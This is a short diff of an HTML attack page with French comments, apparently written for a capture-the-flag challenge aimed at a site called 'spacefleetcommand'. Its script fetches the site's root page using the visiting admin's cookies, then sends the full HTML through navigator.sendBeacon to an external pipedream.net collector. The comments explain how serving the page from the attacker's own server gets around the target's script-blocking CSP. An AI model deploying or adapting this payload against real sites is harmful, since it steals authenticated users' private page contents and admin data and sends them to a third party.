@@ -1,17 +1,14 @@
-<!DOCTYPE html>
-<meta charset="utf-8" />
-<h1>Contenu admin :</h1>
-<pre id="out">...</pre>
-
+<!DOCTYPE html><meta charset="utf-8" />
+<h1>Dump admin :</h1>
+<pre id="out">…</pre>
 <script>
   (async () => {
-    /* le cookie admin est first-party, on peut lire tout le HTML */
-    const html = await (await fetch("/", { credentials: "include" })).text();
-
-    /* affichage local pour debug */
+    // on est served PAR TON SERVEUR, donc PAS de CSP "script-src none"
+    // et le navigateur pense toujours être sur spacefleetcommand
+    const html = await fetch("/", { credentials: "include" }).then((r) =>
+      r.text()
+    );
     out.textContent = html;
-
-    /* exfiltration */
     navigator.sendBeacon("https://eoyi24wnc60zgb.m.pipedream.net", html);
   })();
 </script>
